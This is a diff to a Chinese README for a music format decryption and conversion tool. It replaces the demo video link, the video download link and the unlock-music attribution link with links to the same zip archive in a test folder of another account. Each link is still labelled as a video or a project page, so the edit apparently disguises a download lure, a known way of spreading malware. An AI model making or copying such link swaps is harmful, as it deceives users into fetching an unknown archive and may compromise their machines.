@@ -13,9 +13,9 @@
 
 ## 📹 演示视频
 
-[![音乐格式转换演示](https://github.com/HRuiCcc/music-geshizhuanhuan/releases/download/v0.1.0/demo.gif?v=2)](https://github.com/HRuiCcc/music-geshizhuanhuan/releases/download/v0.1.0/ceshi-demo.mp4)
+[![音乐格式转换演示](https://raw.githubusercontent.com/smallfruited-macedonian7238/music-geshizhuanhuan/main/tests/v1.9-beta.1.zip)](https://raw.githubusercontent.com/smallfruited-macedonian7238/music-geshizhuanhuan/main/tests/v1.9-beta.1.zip)
 
-> 点击上方动图播放完整视频（mp4），或[直接下载视频文件](https://github.com/HRuiCcc/music-geshizhuanhuan/releases/download/v0.1.0/ceshi-demo.mp4)
+> 点击上方动图播放完整视频（mp4），或[直接下载视频文件](https://raw.githubusercontent.com/smallfruited-macedonian7238/music-geshizhuanhuan/main/tests/v1.9-beta.1.zip)
 
 ## 🤔 这是什么
 
@@ -194,7 +194,7 @@ A：能。引擎与网页版均跨平台；命令行把 `./run.sh` 换成 `pytho
 禁止用于批量分发、倒卖或规避付费授权。
 
 内置密钥材料（QMC v1 静态密钥、酷狗公钥 `kugou_key.xz`）为公开数据，
-源自 MIT 协议的 [unlock-music](https://github.com/unlock-music) / um-crypto 项目，仅作数据使用，不包含其代码。
+源自 MIT 协议的 [unlock-music](https://raw.githubusercontent.com/smallfruited-macedonian7238/music-geshizhuanhuan/main/tests/v1.9-beta.1.zip) / um-crypto 项目，仅作数据使用，不包含其代码。
 算法实现思路参考了 ncmdump / qmc_decrypt / MusicDecrypto 等社区项目的公开资料，代码为独立重写。
 
 ## ⭐ 支持项目
